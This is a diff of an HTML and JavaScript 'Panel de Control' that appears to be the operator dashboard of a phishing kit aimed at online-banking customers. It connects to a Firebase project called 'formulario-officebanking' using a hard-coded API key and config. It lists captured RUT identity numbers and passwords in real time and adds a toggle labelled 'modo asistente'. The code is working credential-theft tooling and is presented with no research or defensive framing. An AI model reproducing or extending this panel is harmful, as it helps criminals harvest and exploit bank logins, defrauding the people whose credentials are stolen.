@@ -1,1 +1,95 @@
-<html><body><h2>Panel de Control</h2><button onclick="firebase.database().ref('validacion_estado').set('siguiente')">Siguiente</button></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Panel de Control</title>
+  <meta charset="utf-8" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    .switch {
+      margin-bottom: 20px;
+    }
+    .registro {
+      border: 1px solid #ccc;
+      margin-bottom: 10px;
+      padding: 10px;
+    }
+    .activo {
+      color: green;
+    }
+    .inactivo {
+      color: red;
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+</head>
+<body>
+  <h2>Panel de Control</h2>
+
+  <div class="switch">
+    <label>Modo Asistente: <span id="estadoPanel" class="inactivo">INACTIVO</span></label>
+    <button onclick="toggleModo()">Activar / Desactivar</button>
+  </div>
+
+  <h3>Registros en vivo:</h3>
+  <div id="datos"></div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function toggleModo() {
+      db.ref("modo_asistente").once("value").then(snapshot => {
+        const nuevoValor = !snapshot.val();
+        db.ref("modo_asistente").set(nuevoValor);
+      });
+    }
+
+    db.ref("modo_asistente").on("value", snap => {
+      const estado = snap.val();
+      const estadoEl = document.getElementById("estadoPanel");
+      if (estado) {
+        estadoEl.textContent = "ACTIVO";
+        estadoEl.className = "activo";
+      } else {
+        estadoEl.textContent = "INACTIVO";
+        estadoEl.className = "inactivo";
+      }
+    });
+
+    db.ref("usuarios").on("value", snap => {
+      const contenedor = document.getElementById("datos");
+      contenedor.innerHTML = "";
+      const usuarios = snap.val();
+      if (usuarios) {
+        const ordenados = Object.entries(usuarios).sort((a, b) => {
+          return new Date(b[1].hora || "") - new Date(a[1].hora || "");
+        });
+        ordenados.forEach(([key, val]) => {
+          const div = document.createElement("div");
+          div.className = "registro";
+          div.innerHTML = `
+            <strong>🕒 ${val.hora || ""}</strong><br>
+            👤 RUT: ${val.rut || ""}<br>
+            🔐 Contraseña: ${val.clave || ""}
+          `;
+          contenedor.appendChild(div);
+        });
+      }
+    });
+  </script>
+</body>
+</html>
